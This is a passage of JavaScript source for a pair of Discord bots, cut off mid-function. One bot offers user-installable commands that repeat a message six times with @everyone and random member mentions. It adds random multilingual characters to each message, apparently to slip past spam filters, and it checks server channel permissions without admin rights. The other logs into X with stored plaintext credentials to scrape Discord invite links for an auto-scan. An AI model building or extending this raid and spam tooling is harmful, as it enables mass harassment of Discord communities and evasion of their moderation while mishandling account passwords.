const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ApplicationIntegrationType, InteractionContextType, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, EmbedBuilder, PermissionFlagsBits } = require('discord.js');
const axios = require('axios');
const config = require('./config');
const { getUserCustomMessages, addUserCustomMessage, deleteUserCustomMessage, getUserCustomMessageById, getUserCustomMessageByIdOrTitle, getAlinkSettings, updateAlinkSettings, getAllAlinkSettings, getAutoScanPanelConfig, updateAutoScanPanelConfig } = require('./storage/fileStorage');
const { handleControlPanelCommand, controlPanelButtonHandlers, controlPanelSelectHandlers, controlPanelModalHandlers } = require('./utils/controlPanelController');
const { scanGuildForInvites } = require('./utils/discordInviteScanner');

// Shared channel monitor settings
const channelMonitorSettings = new Map();

const BOT_TOKEN = config.BOT_TOKEN;
const BOT_TOKEN_2 = config.BOT_TOKEN_2;
const CLIENT_ID = config.CLIENT_ID;

let storedMemberIds = [];

const generateRandomChars = (length = config.RANDOM_CHAR_LENGTH) => {
    const korean = 'ㄱㄴㄷㄹㅁㅂㅅㅇㅈㅊㅋㅌㅍㅎㅏㅓㅗㅜㅡㅣ가나다라마바사아자차카타파하강건곤공관국군궁권귀규근기길남녀노눈달담대덕도동두란령로류륜리림마망명모목문물미민박반방배백법병보복본봉부북분불비빈사산삼상서석선설성세소손송수숙순술승시신실심안양언업연열영오옥온완왕요용우운울원월위유윤은을음읍의이익인일임자작잔장재전절점정제조종주준중지진집창천철청체초촌총추충취측친침칭태택토통퇴파판팔패평포표풍피필하학한항해허헌험현형혜호혼홍화환활황회효후훈훨휘휴흉흑흔흘흠흡흥희';
    const chinese = '你好世界中国日本韩国爱心快乐幸福美丽天地人山水火风云雨雪花草树木金银铜铁龙凤虎鹤鸟鱼蝶蜂蛇狼狐猫狗熊象马牛羊猪兔鸡鸭鹅雀燕鸿鹏鹤凰麟龟蛙蟹虾蚁蚂蝉蜻蜓蝴蝶萤蟋蟀甲乙丙丁戊己庚辛壬癸子丑寅卯辰巳午未申酉戌亥春夏秋冬东西南北上下左右前后内外高低大小长短轻重新旧老少男女父母兄弟姐妹夫妻儿女孙祖';
    const japanese = 'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをんアイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
    const thai = 'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรลวศษสหฬอฮ';
    const russian = 'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдеёжзийклмнопрстуфхцчшщъыьэюя';
    const arabic = 'ابتثجحخدذرزسشصضطظعغفقكلمنهوي';
    const hindi = 'अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसह';
    const greek = 'ΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩαβγδεζηθικλμνξοπρστυφχψω';
    const hebrew = 'אבגדהוזחטיכלמנסעפצקרשת';
    const vietnamese = 'ăâđêôơưàảãáạằẳẵắặầẩẫấậèẻẽéẹềểễếệìỉĩíịòỏõóọồổỗốộờởỡớợùủũúụừửữứựỳỷỹýỵ';
    const symbols = '★☆♠♣♥♦♤♧♡♢☀☁☂☃☄★☆☎☏✓✔✕✖✗✘❤❥❦❧♩♪♫♬♭♮♯';
    const english = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    
    const allChars = korean + chinese + japanese + thai + russian + arabic + hindi + greek + hebrew + vietnamese + symbols + english;
    
    let result = '';
    for (let i = 0; i < length; i++) {
        result += allChars[Math.floor(Math.random() * allChars.length)];
    }
    return result;
};

const addRandomCharsToMessage = (message, length = config.RANDOM_CHAR_LENGTH) => {
    const randomChars = generateRandomChars(length);
    const addToStart = Math.random() < 0.5;
    
    if (addToStart) {
        return randomChars + ' ' + message;
    } else {
        return message + ' ' + randomChars;
    }
};

const getRandomMentions = (count) => {
    if (storedMemberIds.length === 0) return '';
    
    const shuffled = [...storedMemberIds].sort(() => Math.random() - 0.5);
    const selected = shuffled.slice(0, Math.min(count, shuffled.length));
    return selected.map(id => `<@${id}>`).join(' ');
};

const setMemberIds = (ids) => {
    storedMemberIds = ids;
    console.log(`Stored ${ids.length} member IDs for random mentions`);
};

const getMemberIds = () => storedMemberIds;

let registeredAtestCommand = null;
let registeredAaddCommand = null;
let registeredAevCommand = null;
let registeredAheCommand = null;
let registeredAserverCommand = null;

const getRegisteredAtestCommand = () => registeredAtestCommand;
const getRegisteredAaddCommand = () => registeredAaddCommand;
const getRegisteredAevCommand = () => registeredAevCommand;
const getRegisteredAheCommand = () => registeredAheCommand;
const getRegisteredAserverCommand = () => registeredAserverCommand;

const aheButtonData = new Map();

const pendingAtestMessages = new Map();

const getAtestMessage = (messageId) => pendingAtestMessages.get(messageId);
const clearAtestMessage = (messageId) => pendingAtestMessages.delete(messageId);

const registerCommands = async () => {
    const commands = [
        new SlashCommandBuilder()
            .setName('atest')
            .setDescription('サイト用のコマンドです。使わないで')
            .addStringOption(option =>
                option.setName('test_id')
                    .setDescription('テスト識別子（自動生成）')
                    .setRequired(false))
            .setIntegrationTypes([
                ApplicationIntegrationType.GuildInstall,
                ApplicationIntegrationType.UserInstall
            ])
            .setContexts([
                InteractionContextType.Guild,
                InteractionContextType.BotDM,
                InteractionContextType.PrivateChannel
            ]),
        new SlashCommandBuilder()
            .setName('aadd')
            .setDescription('カスタムデフォルトメッセージを管理します')
            .addSubcommand(subcommand =>
                subcommand
                    .setName('add')
                    .setDescription('新しいカスタムメッセージを追加します')
                    .addStringOption(option =>
                        option.setName('content')
                            .setDescription('保存するメッセージ（文字制限なし）')
                            .setRequired(true))
                    .addStringOption(option =>
                        option.setName('title')
                            .setDescription('タイトル（識別用）')
                            .setRequired(false)))
            .addSubcommand(subcommand =>
                subcommand
                    .setName('list')
                    .setDescription('自分のカスタムメッセージ一覧を表示します'))
            .addSubcommand(subcommand =>
                subcommand
                    .setName('delete')
                    .setDescription('カスタムメッセージを削除します')
                    .addStringOption(option =>
                        option.setName('id')
                            .setDescription('削除するメッセージのID')
                            .setRequired(true)))
            .setIntegrationTypes([
                ApplicationIntegrationType.GuildInstall,
                ApplicationIntegrationType.UserInstall
            ])
            .setContexts([
                InteractionContextType.Guild,
                InteractionContextType.BotDM,
                InteractionContextType.PrivateChannel
            ]),
        new SlashCommandBuilder()
            .setName('aev')
            .setDescription('自分にしか見えない@everyoneを表示します')
            .setIntegrationTypes([
                ApplicationIntegrationType.GuildInstall,
                ApplicationIntegrationType.UserInstall
            ])
            .setContexts([
                InteractionContextType.Guild,
                InteractionContextType.BotDM,
                InteractionContextType.PrivateChannel
            ]),
        new SlashCommandBuilder()
            .setName('ahe')
            .setDescription('メッセージを6回送信（何も入れないとデフォルト）')
            .addIntegerOption(option =>
                option.setName('rand_len')
                    .setDescription('ランダム文字列の長さ (1-64)')
                    .setRequired(false)
                    .setMinValue(1)
                    .setMaxValue(64))
            .addBooleanOption(option =>
                option.setName('mention_everyone')
                    .setDescription('@everyoneメンションを付けるかどうか')
                    .setRequired(false))
            .addStringOption(option =>
                option.setName('text')
                    .setDescription('言わせたい言葉（何も入れないとデフォルトメッセージ）')
                    .setRequired(false))
            .addBooleanOption(option =>
                option.setName('use_custom')
                    .setDescription('自分のカスタムメッセージを使う（最新のものを自動選択）')
                    .setRequired(false))
            .addStringOption(option =>
                option.setName('custom_id')
                    .setDescription('特定のカスタムメッセージIDを指定（任意）')
                    .setRequired(false))
            .addStringOption(option =>
                option.setName('user_ids')
                    .setDescription('メンションするユーザーID（カンマか空白で区切って複数入力可能）')
                    .setRequired(false))
            .addIntegerOption(option =>
                option.setName('mention_count')
                    .setDescription('ランダムでメンションする人数')
                    .setRequired(false)
                    .setMinValue(1))
            .addBooleanOption(option =>
                option.setName('use_random_text')
                    .setDescription('ランダム文字を付けるかどうか（デフォルト: false）')
                    .setRequired(false))
            .setIntegrationTypes([
                ApplicationIntegrationType.GuildInstall,
                ApplicationIntegrationType.UserInstall
            ])
            .setContexts([
                InteractionContextType.Guild,
                InteractionContextType.BotDM,
                InteractionContextType.PrivateChannel
            ]),
        new SlashCommandBuilder()
            .setName('aserver')
            .setDescription('サーバーの全チャンネル権限を確認します（Botなし・管理者不要）')
            .setIntegrationTypes([
                ApplicationIntegrationType.GuildInstall,
                ApplicationIntegrationType.UserInstall
            ])
            .setContexts([
                InteractionContextType.Guild,
                InteractionContextType.BotDM,
                InteractionContextType.PrivateChannel
            ]),
        new SlashCommandBuilder()
            .setName('m')
            .setDescription('botがメッセージを代わりに送信します')
            .addStringOption(option =>
                option.setName('message')
                    .setDescription('botに言わせたいメッセージ（何も入れないとデフォルトメッセージ）')
                    .setRequired(false))
            .setIntegrationTypes([
                ApplicationIntegrationType.GuildInstall,
                ApplicationIntegrationType.UserInstall
            ])
            .setContexts([
                InteractionContextType.Guild,
                InteractionContextType.BotDM,
                InteractionContextType.PrivateChannel
            ])
    ];

    const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);

    try {
        console.log('Started refreshing application (/) commands.');

        const result = await rest.put(
            Routes.applicationCommands(CLIENT_ID),
            { body: commands.map(cmd => cmd.toJSON()) }
        );

        const atestCmd = result.find(cmd => cmd.name === 'atest');
        if (atestCmd) {
            registeredAtestCommand = atestCmd;
            console.log(`Registered atest command: ID=${atestCmd.id}, Version=${atestCmd.version}`);
        }

        const aaddCmd = result.find(cmd => cmd.name === 'aadd');
        if (aaddCmd) {
            registeredAaddCommand = aaddCmd;
            console.log(`Registered aadd command: ID=${aaddCmd.id}, Version=${aaddCmd.version}`);
        }

        const aevCmd = result.find(cmd => cmd.name === 'aev');
        if (aevCmd) {
            registeredAevCommand = aevCmd;
            console.log(`Registered aev command: ID=${aevCmd.id}, Version=${aevCmd.version}`);
        }

        const aheCmd = result.find(cmd => cmd.name === 'ahe');
        if (aheCmd) {
            registeredAheCommand = aheCmd;
            console.log(`Registered ahe command: ID=${aheCmd.id}, Version=${aheCmd.version}`);
        }

        const aserverCmd = result.find(cmd => cmd.name === 'aserver');
        if (aserverCmd) {
            registeredAserverCommand = aserverCmd;
            console.log(`Registered aserver command: ID=${aserverCmd.id}, Version=${aserverCmd.version}`);
        }

        console.log('Successfully registered application commands.');
        return { success: true };
    } catch (error) {
        console.error('Error registering commands:', error);
        return { success: false, error: error.message };
    }
};

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
    allowedMentions: { parse: ['everyone', 'roles', 'users'] }
});

// 2つ目のBot Client
const client2 = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
    allowedMentions: { parse: ['everyone', 'roles', 'users'] }
});

// Bot1用mコマンドのデータストア
const mButtonData = new Map();

// Bot2用コマンド登録
const registerBot2Commands = async () => {
    const commands = [
        {
            name: 'autoscan',
            description: '管理パネルの設定で自動スキャンを開始',
            options: [
                { name: 'start', description: '保存された設定で自動スキャンを開始', type: 1 }
            ],
            contexts: [0],
            integration_types: [0]
        },
        {
            name: 'alinkauto',
            description: '管理パネルの設定で自動スキャンを開始',
            contexts: [0],
            integration_types: [0]
        },
        {
            name: 'alinkautostop',
            description: '自動スキャンを停止',
            contexts: [0],
            integration_types: [0]
        },
        {
            name: 'acamerasetup',
            description: 'このチャンネルをカメラ画像受信チャンネルに設定します',
            contexts: [0],
            integration_types: [0]
        },
        {
            name: 'alink',
            description: 'XからDiscord招待リンクを自動取得する設定',
            options: [
                {
                    name: 'setup',
                    description: '取得先チャンネルとX認証情報を設定',
                    type: 1,
                    options: [
                        { name: 'channel', description: 'リンクを投稿するチャンネル', type: 7, required: true },
                        { name: 'x_username', description: 'Xのユーザー名', type: 3, required: true },
                        { name: 'x_password', description: 'Xのパスワード', type: 3, required: true },
                        { name: 'x_email', description: 'Xに登録したメールアドレス（推奨）', type: 3, required: false },
                        { name: 'search', description: '検索キーワード（デフォルト: discord.gg）', type: 3, required: false }
                    ]
                },
                {
                    name: 'filter',
                    description: 'フィルター設定',
                    type: 1,
                    options: [
                        { name: 'japanese_only', description: '日本語の投稿のみ取得', type: 5, required: false },
                        { name: 'require_keywords', description: '必須キーワード（カンマ区切りで複数可）', type: 3, required: false },
                        { name: 'exclude_keywords', description: '除外キーワード（カンマ区切りで複数可）', type: 3, required: false }
                    ]
                },
                { name: 'start', description: '自動取得を開始', type: 1 },
                { name: 'stop', description: '自動取得を停止', type: 1 },
                { name: 'status', description: '現在の設定状況を確認', type: 1 },
                { name: 'fetch', description: '今すぐリンクを取得', type: 1 },
                {
                    name: 'history',
                    description: '過去の期間からリンクを一括取得',
                    type: 1,
                    options: [
                        { name: 'days', description: '何日前までさかのぼるか（1-30日）', type: 4, required: true, min_value: 1, max_value: 30 },
                        { name: 'limit', description: '取得する最大件数（デフォルト: 100）', type: 4, required: false, min_value: 10, max_value: 500 }
                    ]
                },
                {
                    name: 'verify',
                    description: '確認コードを入力してログインを完了',
                    type: 1,
                    options: [
                        { name: 'code', description: 'Xから送られた確認コード', type: 3, required: true }
                    ]
                }
            ],
            contexts: [0],
            integration_types: [0]
        }
    ];

    const rest = new REST({ version: '10' }).setToken(BOT_TOKEN_2);
    try {
        console.log('[Bot2] スラッシュコマンドを登録しています...');
        await rest.put(Routes.applicationCommands(client2.user.id), { body: commands });
        console.log('[Bot2] スラッシュコマンドの登録が完了しました！');
    } catch (error) {
        console.error('[Bot2] コマンド登録エラー:', error);
    }
};

// ========== ALINK 関連 (Bot2用) ==========
const alinkIntervals = new Map();
const autoscanIntervals = new Map();
const autoscanSentLinks = new Map(); // 送信済みリンクを記録

function containsJapanese(text) {
    const japaneseRegex = /[\u3040-\u309F\u30A0-\u30FF\u4E00-\u9FAF]/;
    return japaneseRegex.test(text);
}

function passesFilters(text, settings) {
    if (settings.japaneseOnly && !containsJapanese(text)) {
        return false;
    }
    
    if (settings.requireKeywords && settings.requireKeywords.length > 0) {
        const hasRequired = settings.requireKeywords.some(keyword => 
            text.toLowerCase().includes(keyword.toLowerCase())
        );
        if (!hasRequired) return false;
    }
    
    if (settings.excludeKeywords && settings.excludeKeywords.length > 0) {
        const hasExcluded = settings.excludeKeywords.some(keyword => 
            text.toLowerCase().includes(keyword.toLowerCase())
        );
        if (hasExcluded) return false;
    }
    
    return true;
}

async function handleAlinkSlashCommand(interaction) {
    if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
        return interaction.reply({
            content: '❌ このコマンドを使用するには管理者権限が必要です。',
            ephemeral: true
        });
    }
    
    const subcommand = interaction.options.getSubcommand();
    const guildId = interaction.guild.id;
    
    if (subcommand === 'setup') {
        const channel = interaction.options.getChannel('channel');
        const xUsername = interaction.options.getString('x_username');
        const xPassword = interaction.options.getString('x_password');
        const xEmail = interaction.options.getString('x_email');
        const searchQuery = interaction.options.getString('search') || 'discord.gg';
        
        await interaction.deferReply({ ephemeral: true });
        
        const loginResult = await initScraper(guildId, xUsername, xPassword, xEmail);
        
        if (!loginResult.success) {
            if (loginResult.needsVerification) {
                return interaction.editReply({
                    content: '📧 **確認コードが必要です！**\n\nXからメールで確認コードが送信されました。\nコードを確認したら、以下のコマンドで入力してください：\n\n`/alink verify code:あなたのコード`\n\n⏰ 10分以内に入力してください。'
                });
            }
            return interaction.editReply({
                content: '❌ Xへのログインに失敗しました。\n\n**確認してください：**\n• ユーザー名は@なしで入力（例: `username123`）\n• パスワードが正しいか\n• 2段階認証がオフになっているか\n• アカウントがロックされていないか\n\nサーバーログに詳細なエラーが記録されています。'
            });
        }
        
        const settings = {
            enabled: false,
            channelId: channel.id,
            searchQuery: searchQuery,
            interval: 5,
            xUsername: xUsername,
            xPassword: xPassword,
            xEmail: xEmail || null,
            lastCheck: null,
            postedLinks: [],
            japaneseOnly: false,
            requireKeywords: [],
            excludeKeywords: []
        };
        
        await updateAlinkSettings(guildId, settings);
        
        const embed = new EmbedBuilder()
            .setTitle('✅ Alink 設定完了')
            .setColor(0x00FF00)
            .addFields(
                { name: '📺 投稿チャンネル', value: `<#${channel.id}>`, inline: true },
                { name: '🔍 検索キーワード', value: searchQuery, inline: true },
                { name: '👤 Xアカウント', value: xUsername, inline: true }
            )
            .setDescription('`/alink start` で自動取得を開始できます。')
            .setTimestamp();
        
        return interaction.editReply({ embeds: [embed] });
        
    } else if (subcommand === 'start') {
        const settings = await getAlinkSettings(guildId);
        
        if (!settings.channelId) {
            return interaction.reply({
                content: '❌ 先に `/alink setup` で設定を行ってください。',
                ephemeral: true
            });
        }
        
        if (settings.enabled) {
            return interaction.reply({
                content: '⚠️ 自動取得は既に有効です。',
                ephemeral: true
            });
        }
        
        if (!isScraperReady(guildId)) {
            await interaction.deferReply({ ephemeral: true });
            const loginResult = await initScraper(guildId, settings.xUsername, settings.xPassword, settings.xEmail);
            if (!loginResult.success) {
                return interaction.editReply({
                    content: '❌ Xへのログインに失敗しました。`/alink setup` で再設定してください。'
                });
            }
        }
        
        settings.enabled = true;
        await updateAlinkSettings(guildId, settings);
        
        startAlinkInterval(guildId, interaction.guild);
        
        const replyMethod = interaction.deferred ? 'editReply' : 'reply';
        return interaction[replyMethod]({
            content: `✅ 自動取得を開始しました！\n📺 投稿先: <#${settings.channelId}>\n🔍 検索: ${settings.searchQuery}\n⏰ 間隔: 5分ごと（/alink stop で停止するまで継続）`,
            ephemeral: true
        });
        
    } else if (subcommand === 'stop') {
        const settings = await getAlinkSettings(guildId);
        
        if (!settings.enabled) {
            return interaction.reply({
                content: '⚠️ 自動取得は既に停止しています。',
                ephemeral: true
            });
        }
        
        settings.enabled = false;
        await updateAlinkSettings(guildId, settings);
        
        if (alinkIntervals.has(guildId)) {
            clearInterval(alinkIntervals.get(guildId));
            alinkIntervals.delete(guildId);
        }
        
        return interaction.reply({
            content: '✅ 自動取得を停止しました。',
            ephemeral: true
        });
        
    } else if (subcommand === 'filter') {
        const settings = await getAlinkSettings(guildId);
        
        if (!settings.channelId) {
            return interaction.reply({
                content: '❌ 先に `/alink setup` で設定を行ってください。',
                ephemeral: true
            });
        }
        
        const japaneseOnly = interaction.options.getBoolean('japanese_only');
        const requireKeywords = interaction.options.getString('require_keywords');
        const excludeKeywords = interaction.options.getString('exclude_keywords');
        
        if (japaneseOnly !== null) {
            settings.japaneseOnly = japaneseOnly;
        }
        
        if (requireKeywords !== null) {
            settings.requireKeywords = requireKeywords.split(',').map(k => k.trim()).filter(k => k);
        }
        
        if (excludeKeywords !== null) {
            settings.excludeKeywords = excludeKeywords.split(',').map(k => k.trim()).filter(k => k);
        }
        
        await updateAlinkSettings(guildId, settings);
        
        const embed = new EmbedBuilder()
            .setTitle('✅ フィルター設定更新')
            .setColor(0x00FF00)
            .addFields(
                { name: '🇯🇵 日本語のみ', value: settings.japaneseOnly ? '✅ 有効' : '❌ 無効', inline: true },
                { name: '✅ 必須キーワード', value: settings.requireKeywords.length > 0 ? settings.requireKeywords.join(', ') : 'なし', inline: false },
                { name: '❌ 除外キーワード', value: settings.excludeKeywords.length > 0 ? settings.excludeKeywords.join(', ') : 'なし', inline: false }
            )
            .setTimestamp();
        
        return interaction.reply({ embeds: [embed], ephemeral: true });
        
    } else if (subcommand === 'status') {
        const settings = await getAlinkSettings(guildId);
        
        const embed = new EmbedBuilder()
            .setTitle('📊 Alink ステータス')
            .setColor(settings.enabled ? 0x00FF00 : 0xFF0000)
            .addFields(
                { name: '🔄 状態', value: settings.enabled ? '✅ 有効' : '❌ 無効', inline: true },
                { name: '📺 チャンネル', value: settings.channelId ? `<#${settings.channelId}>` : '未設定', inline: true },
                { name: '🔍 検索', value: settings.searchQuery || 'discord.gg', inline: true },
                { name: '⏰ 間隔', value: `${settings.interval || 5}分`, inline: true },
                { name: '📝 投稿済みリンク数', value: `${(settings.postedLinks || []).length}件`, inline: true },
                { name: '🇯🇵 日本語のみ', value: settings.japaneseOnly ? '✅' : '❌', inline: true },
                { name: '✅ 必須キーワード', value: (settings.requireKeywords || []).length > 0 ? settings.requireKeywords.join(', ') : 'なし', inline: false },
                { name: '❌ 除外キーワード', value: (settings.excludeKeywords || []).length > 0 ? settings.excludeKeywords.join(', ') : 'なし', inline: false }
            )
            .setTimestamp();
        
        return interaction.reply({ embeds: [embed], ephemeral: true });
        
    } else if (subcommand === 'fetch') {
        const settings = await getAlinkSettings(guildId);
        
        if (!settings.channelId) {
            return interaction.reply({
                content: '❌ 先に `/alink setup` で設定を行ってください。',
                ephemeral: true
            });
        }
        
        await interaction.deferReply({ ephemeral: true });
        
        if (!isScraperReady(guildId)) {
            const loginResult = await initScraper(guildId, settings.xUsername, settings.xPassword, settings.xEmail);
            if (!loginResult.success) {
                return interaction.editReply({
                    content: '❌ Xへのログインに失敗しました。'
                });
            }
        }
        
        const results = await getNewDiscordLinks(guildId, settings.searchQuery, 20);
        
        if (results.length === 0) {
            return interaction.editReply({
                content: '📭 新しいDiscordリンクは見つかりませんでした。'
            });
        }
        
        const channel = await interaction.guild.channels.fetch(settings.channelId);
        let postedCount = 0;
        
        for (const result of results) {
            if (!passesFilters(result.text, settings)) continue;
            
            for (const link of result.links) {
                if (!settings.postedLinks.includes(link)) {
                    const embed = new EmbedBuilder()
                        .setTitle('🔗 新しいDiscord招待リンク')
                        .setColor(0x5865F2)
                        .addFields(
                            { name: '📎 リンク', value: link, inline: false },
                            { name: '👤 投稿者', value: `@${result.username}`, inline: true },
                            { name: '📅 時間', value: new Date(result.timestamp).toLocaleString('ja-JP'), inline: true }
                        )
                        .setFooter({ text: `Tweet ID: ${result.tweetId}` })
                        .setTimestamp();
                    
                    await channel.send({ embeds: [embed] });
                    settings.postedLinks.push(link);
                    postedCount++;
                    
                    if (settings.postedLinks.length > 500) {
                        settings.postedLinks = settings.postedLinks.slice(-500);
                    }
                }
            }
        }
        
        await updateAlinkSettings(guildId, settings);
        
        return interaction.editReply({
            content: `✅ ${postedCount}件の新しいリンクを投稿しました！`
        });
        
    } else if (subcommand === 'history') {
        const settings = await getAlinkSettings(guildId);
        
        if (!settings.channelId) {
            return interaction.reply({
                content: '❌ 先に `/alink setup` で設定を行ってください。',
                ephemeral: true
            });
        }
        
        const days = interaction.options.getInteger('days');
        const limit = interaction.options.getInteger('limit') || 100;
        
        await interaction.deferReply({ ephemeral: true });
        
        if (!isScraperReady(guildId)) {
            const loginResult = await initScraper(guildId, settings.xUsername, settings.xPassword, settings.xEmail);
            if (!loginResult.success) {
                return interaction.editReply({
                    content: '❌ Xへのログインに失敗しました。'
                });
            }
        }
        
        await interaction.editReply({
            content: `🔍 過去${days}日間のリンクを検索中... (最大${limit}件)`
        });
        
        const results = await searchHistoricalLinks(guildId, settings.searchQuery, days, limit);
        
        if (results.length === 0) {
            return interaction.editReply({
                content: `📭 過去${days}日間でDiscordリンクは見つかりませんでした。`
            });
        }
        
        const channel = await interaction.guild.channels.fetch(settings.channelId);
        let postedCount = 0;
        let skippedCount = 0;
        
        for (const result of results) {
            if (!passesFilters(result.text, settings)) {
                skippedCount++;
                continue;
            }
            
            for (const link of result.links) {
                if (!settings.postedLinks.includes(link)) {
                    const embed = new EmbedBuilder()
                        .setTitle('🔗 Discord招待リンク（過去取得）')
                        .setColor(0x9B59B6)
                        .addFields(
                            { name: '📎 リンク', value: link, inline: false },
                            { name: '👤 投稿者', value: `@${result.username}`, inline: true },
                            { name: '📅 投稿日時', value: new Date(result.timestamp).toLocaleString('ja-JP'), inline: true }
                        )
                        .setFooter({ text: `Tweet ID: ${result.tweetId} | 過去${days}日検索` })
                        .setTimestamp();
                    
                    await channel.send({ embeds: [embed] });
                    settings.postedLinks.push(link);
                    postedCount++;
                    
                    if (settings.postedLinks.length > 500) {
                        settings.postedLinks = settings.postedLinks.slice(-500);
                    }
                    
                    await new Promise(r => setTimeout(r, 500));
                }
            }
        }
        
        await updateAlinkSettings(guildId, settings);
        
        return interaction.editReply({
            content: `✅ 過去${days}日間から${postedCount}件のリンクを投稿しました！\n${skippedCount > 0 ? `(フィルターにより${skippedCount}件スキップ)` : ''}`
        });
        
    } else if (subcommand === 'verify') {
        const code = interaction.options.getString('code');
        
        if (!hasPendingLogin(guildId)) {
            return interaction.reply({
                content: '❌ 確認待ちのログインがありません。\n先に `/alink setup` を実行してください。',
                ephemeral: true
            });
        }
        
        await interaction.deferReply({ ephemeral: true });
        
        const verifyResult = await verifyLogin(guildId, code);
        
        if (!verifyResult.success) {
            if (verifyResult.error === 'expired') {
                return interaction.editReply({
                    content: '⏰ 確認コードの有効期限が切れました。\n`/alink setup` からやり直してください。'
                });
            }
            return interaction.editReply({
                content: '❌ 確認コードが正しくありません。\nもう一度確認して入力してください。\n\n`/alink verify code:正しいコード`'
            });
        }
        
        const embed = new EmbedBuilder()
            .setTitle('✅ Xログイン成功！')
            .setColor(0x00FF00)
            .setDescription('確認コードで認証が完了しました。\n`/alink start` で自動取得を開始できます。')
            .setTimestamp();
        
        return interaction.editReply({ embeds: [embed] });
    }
}

async function fetchAndPostLinks(guildId, guild) {
    try {
        const settings = await getAlinkSettings(guildId);
        
        if (!settings.enabled || !settings.channelId) return;
        
        if (!isScraperReady(guildId)) {
            console.log(`[Alink] ${guildId}: スクレイパー未準備、ログイン試行中...`);
            const loginResult = await initScraper(guildId, settings.xUsername, settings.xPassword, settings.xEmail);
            if (!loginResult.success) {
                console.log(`[Alink] ${guildId}: Xログイン失敗、次回再試行`);
                return;
            }
            console.log(`[Alink] ${guildId}: Xログイン成功`);
        }
        
        const results = await getNewDiscordLinks(guildId, settings.searchQuery, 20);
        
        if (!isScraperReady(guildId)) {
            console.log(`[Alink] ${guildId}: セッション失効、次回再ログイン予定`);
            return;
        }
        
        if (results.length === 0) return;
        
        const channel = await guild.channels.fetch(settings.channelId);
        if (!channel) return;
        
        for (const result of results) {
            if (!passesFilters(result.text, settings)) continue;
            
            for (const link of result.links) {
                if (!settings.postedLinks.includes(link)) {
                    const embed = new EmbedBuilder()
                        .setTitle('🔗 新しいDiscord招待リンク')
                        .setColor(0x5865F2)
                        .addFields(
                            { name: '📎 リンク', value: link, inline: false },
                            { name: '👤 投稿者', value: `@${result.username}`, inline: true },
                            { name: '📅 時間', value: new Date(result.timestamp).toLocaleString('ja-JP'), inline: true }
                        )
                        .setFooter({ text: `Tweet ID: ${result.tweetId}` })
                        .setTimestamp();
                    
                    await channel.send({ embeds: [embed] });
                    settings.postedLinks.push(link);
                    
                    if (settings.postedLinks.length > 500) {
                        settings.postedLinks = settings.postedLinks.slice(-500);
                    }
                }
            }
        }
        
        settings.lastCheck = new Date().toISOString();
        await updateAlinkSettings(guildId, settings);
        
        console.log(`[Alink] ${guildId}: チェック完了`);
    } catch (error) {
        console.error(`[Alink] ${guildId}: エラー`, error.message);
    }
}

function startAlinkInterval(guildId, guild) {
    if (alinkIntervals.has(guildId)) {
        clearInterval(alinkIntervals.get(guildId));
    }
    
    const intervalMs = 5 * 60 * 1000;
    
    fetchAndPostLinks(guildId, guild);
    
    const intervalId = setInterval(() => {
        fetchAndPostLinks(guildId, guild);
    }, intervalMs);
    
    alinkIntervals.set(guildId, intervalId);
    console.log(`[Alink] ${guildId}: 自動取得開始 (5分間隔、停止するまで継続)`);
}

async function resumeAllAlinkIntervals() {
    try {
        const allSettings = await getAllAlinkSettings();
        let resumedCount = 0;
        
        for (const [guildId, settings] of Object.entries(allSettings)) {
            if (settings.enabled && settings.channelId && settings.xUsername && settings.xPassword) {
                try {
                    const guild = client2.guilds.cache.get(guildId);
                    if (!guild) {
                        console.log(`[Alink] ${guildId}: サーバーが見つかりません、スキップ`);
                        continue;
                    }
                    
                    const loginSuccess = await initScraper(guildId, settings.xUsername, settings.xPassword, settings.xEmail);
                    if (loginSuccess) {
                        startAlinkInterval(guildId, guild);
                        resumedCount++;
                        console.log(`[Alink] ${guildId}: 自動取得を再開しました`);
                    } else {
                        console.log(`[Alink] ${guildId}: Xログイン失敗、再開スキップ`);
                    }
                    
                    await new Promise(r => setTimeout(r, 2000));
                } catch (error) {
                    console.error(`[Alink] ${guildId}: 再開エラー:`, error.message);
                }
            }
        }
        
        if (resumedCount > 0) {
            console.log(`[Alink] ${resumedCount}個のサーバーで自動取得を再開しました`);
        }
    } catch (error) {
        console.error('[Alink] 自動取得再開エラー:', error.message);
    }
}

const pendingAankoData = new Map();
const recentButtonCreations = new Map();
const buttonPayloadStore = new Map();
const channelButtonCreationTracker = new Map(); // Track buttons awaiting creation: {channelId: {expected: number, created: number, messageIds: [], createdAt, timeout}}

// Multi-channel batch tracker for tracking button creation across multiple channels
const batchButtonTracker = new Map(); // batchId -> { expectedChannels: Set, createdChannels: Set, createdAt: number }

const generateButtonToken = () => {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 8; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
};

const storeButtonPayload = (token, payload) => {
    buttonPayloadStore.set(token, {
        ...payload,
        createdAt: Date.now()
    });
    cleanupButtonPayloads();
};

const getButtonPayload = (token) => {
    return buttonPayloadStore.get(token);
};

const cleanupButtonPayloads = () => {
    const now = Date.now();
    const maxAge = 86400000;
    for (const [token, data] of buttonPayloadStore.entries()) {
        if (now - data.createdAt > maxAge) {
            buttonPayloadStore.delete(token);
        }
    }
};

const getRecentButtonCreation = (channelId) => {
    const data = recentButtonCreations.get(channelId);
    console.log(`getRecentButtonCreation(${channelId}): found=${!!data}, keys=[${Array.from(recentButtonCreations.keys()).join(', ')}]`);
